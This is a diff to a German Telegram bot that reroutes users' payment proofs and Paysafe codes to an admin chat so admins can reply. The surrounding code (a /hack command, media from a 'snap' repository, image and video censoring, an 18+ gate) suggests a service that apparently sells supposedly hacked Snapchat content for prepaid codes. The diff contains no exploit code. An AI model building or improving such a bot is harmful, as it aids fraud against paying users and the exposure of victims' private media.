@@ -53,13 +53,11 @@ PROFILE_DIR = BASE / "profiles"
 for p in (IMAGE_DIR, VIDEO_DIR, TEMP_DIR, PROFILE_DIR):
     p.mkdir(exist_ok=True, parents=True)
 
-# 💬 Mapping: weitergeleitete Nachricht-ID -> ursprüngliche User-ID
-# (Fallback falls forward_from wegen Privatsphäre-Einstellungen leer ist)
+# 💬 Mapping: gesendete Nachricht-ID (in Admin-Chat) -> ursprüngliche User-ID
 forwarded_msg_to_user: dict[int, int] = {}
 
 # 📥 GitHub Media Downloader (Render-optimiert)
 def download_github_media():
-    """Downloads images and videos from GitHub repository"""
     github_api_base = "https://api.github.com/repos/Ayman5552/snap/contents"
 
     imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
@@ -128,7 +126,7 @@ user_proof_sent = set()
 user_content_counts = {}
 
 # ---- Altersverifikation ----
-age_verified = set()  # User-IDs die bereits bestätigt haben
+age_verified = set()
 
 # ---- Video/Bild Verarbeitung ----
 def censor_image(input_path: Path, output_path: Path):
@@ -265,7 +263,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     uid = user.id
 
-    # Wenn noch nicht verifiziert -> Altersabfrage zeigen
     if uid not in age_verified:
         keyboard = [
             [InlineKeyboardButton("✅ Ja, ich bin volljährig (18+)", callback_data="age_yes")],
@@ -280,7 +277,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Bereits verifiziert -> normaler Start
     uname = user.username or ""
     with open(USERS_FILE, "a", encoding="utf-8") as f:
         f.write(f"{uid} {uname}\n")
@@ -305,7 +301,6 @@ async def age_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == "age_yes":
         age_verified.add(uid)
 
-        # User speichern
         uname = user.username or ""
         with open(USERS_FILE, "a", encoding="utf-8") as f:
             f.write(f"{uid} {uname}\n")
@@ -510,7 +505,17 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     try:
-        # Beweis-Foto geht nur an PROOF_ADMIN_ID
+        # Foto mit Beschreibung direkt an ADMIN_CHAT_ID senden (für Reply-Funktion)
+        sent = await context.bot.send_photo(
+            chat_id=ADMIN_CHAT_ID,
+            photo=photo.file_id,
+            caption=forward_text,
+            parse_mode=ParseMode.HTML,
+        )
+        # Mapping speichern: Nachricht-ID im Admin-Chat -> User-ID
+        forwarded_msg_to_user[sent.message_id] = user_id
+
+        # Kopie auch an PROOF_ADMIN_ID senden
         await context.bot.send_photo(
             chat_id=PROOF_ADMIN_ID,
             photo=photo.file_id,
@@ -518,18 +523,11 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML,
         )
 
-        # Native Weiterleitung an ADMIN_CHAT_ID damit er per Reply antworten kann
-        try:
-            forwarded = await context.bot.forward_message(
-                chat_id=ADMIN_CHAT_ID,
-                from_chat_id=user_id,
-                message_id=update.message.message_id,
-            )
-            forwarded_msg_to_user[forwarded.message_id] = user_id
-        except Exception as e:
-            print(f"⚠️ Native Weiterleitung fehlgeschlagen: {e}")
-
-        await update.message.reply_text("✅ Dein Zahlungsbeweis wurde erfolgreich übermittelt! Wir prüfen ihn so schnell wie möglich. Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @OpaHunter 😊")
+        await update.message.reply_text(
+            "✅ Dein Zahlungsbeweis wurde erfolgreich übermittelt! "
+            "Wir prüfen ihn so schnell wie möglich. "
+            "Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @OpaHunter 😊"
+        )
 
     except Exception as e:
         print("Fehler beim Senden des Beweisfotos:", e)
@@ -553,23 +551,24 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         user_proof_sent.add(user_id)
         msg = f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name} (ID: {user_id}):\n<code>{text}</code>"
-        # Paysafe-Code geht nur an PROOF_ADMIN_ID
-        await context.bot.send_message(chat_id=PROOF_ADMIN_ID, text=msg, parse_mode=ParseMode.HTML)
-        await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich übermittelt! Wir melden uns gleich bei dir. 😊")
 
-        # Native Weiterleitung an ADMIN_CHAT_ID für Reply-Funktion
-        try:
-            forwarded = await context.bot.forward_message(
-                chat_id=ADMIN_CHAT_ID,
-                from_chat_id=user_id,
-                message_id=update.message.message_id,
-            )
-            forwarded_msg_to_user[forwarded.message_id] = user_id
-        except Exception as e:
-            print(f"⚠️ Native Weiterleitung fehlgeschlagen: {e}")
+        # Paysafe-Code an ADMIN_CHAT_ID senden und Mapping speichern
+        sent = await context.bot.send_message(
+            chat_id=ADMIN_CHAT_ID,
+            text=msg,
+            parse_mode=ParseMode.HTML,
+        )
+        forwarded_msg_to_user[sent.message_id] = user_id
+
+        # Kopie auch an PROOF_ADMIN_ID
+        await context.bot.send_message(chat_id=PROOF_ADMIN_ID, text=msg, parse_mode=ParseMode.HTML)
+
+        await update.message.reply_text(
+            "✅ Dein Paysafe-Code wurde erfolgreich übermittelt! Wir melden uns gleich bei dir. 😊"
+        )
 
     else:
-        # Alle anderen Nachrichten nativ weiterleiten, damit Admin per Reply antworten kann
+        # Alle anderen Nachrichten an ADMIN_CHAT_ID weiterleiten
         try:
             forwarded = await context.bot.forward_message(
                 chat_id=ADMIN_CHAT_ID,
@@ -579,6 +578,19 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             forwarded_msg_to_user[forwarded.message_id] = user_id
         except Exception as e:
             print(f"❌ Fehler beim Weiterleiten der Nachricht: {e}")
+            # Fallback: als normale Nachricht senden
+            try:
+                fallback_text = (
+                    f"💬 Nachricht von @{from_user.username or from_user.first_name} (ID: {user_id}):\n\n"
+                    f"{text}"
+                )
+                sent = await context.bot.send_message(
+                    chat_id=ADMIN_CHAT_ID,
+                    text=fallback_text,
+                )
+                forwarded_msg_to_user[sent.message_id] = user_id
+            except Exception as e2:
+                print(f"❌ Fallback fehlgeschlagen: {e2}")
 
 # ---- ADMIN REPLY -> USER ----
 async def reply_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -586,11 +598,11 @@ async def reply_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message is None:
         return
 
-    # Nur vom Reply-Admin verarbeiten
+    # Nur vom ADMIN_CHAT_ID verarbeiten
     if update.message.chat_id != ADMIN_CHAT_ID:
         return
 
-    # Nur wenn es eine Reply ist — sonst ignorieren
+    # Nur wenn es eine Reply ist
     if not update.message.reply_to_message:
         return
 
@@ -651,12 +663,6 @@ def main():
     app_builder = ApplicationBuilder().token(TOKEN)
     application = app_builder.build()
 
-    # -------------------------------------------------------
-    # Handler Reihenfolge ist wichtig!
-    # reply_to_user muss VOR handle_text registriert werden,
-    # damit Admin-Replies korrekt erkannt werden.
-    # -------------------------------------------------------
-
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("hack", hack))
     application.add_handler(CommandHandler("pay", pay))
@@ -665,21 +671,17 @@ def main():
     application.add_handler(CommandHandler("invite", invite))
     application.add_handler(CommandHandler("redeem", redeem))
     application.add_handler(CommandHandler("faq", faq))
-    # Altersverifikation (vor button_handler registrieren!)
     application.add_handler(CallbackQueryHandler(age_check, pattern="^age_"))
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
 
-    # Admin Reply -> User:
-    # Kein filters.User — Admin-Check passiert direkt in der Funktion.
-    # Durch group=0 feuert dieser Handler zuerst. reply_to_user ignoriert
-    # alles außer Admin-Replies (chat_id-Check + reply_to_message-Check).
+    # Admin Reply -> User (group=0, feuert zuerst)
     application.add_handler(MessageHandler(
         filters.REPLY & filters.TEXT & ~filters.COMMAND,
         reply_to_user
     ), group=0)
 
-    # Textnachrichten von Usern (Paysafe + allgemeine Weiterleitung) in group=1
+    # Textnachrichten von Usern in group=1
     application.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND,
         handle_text
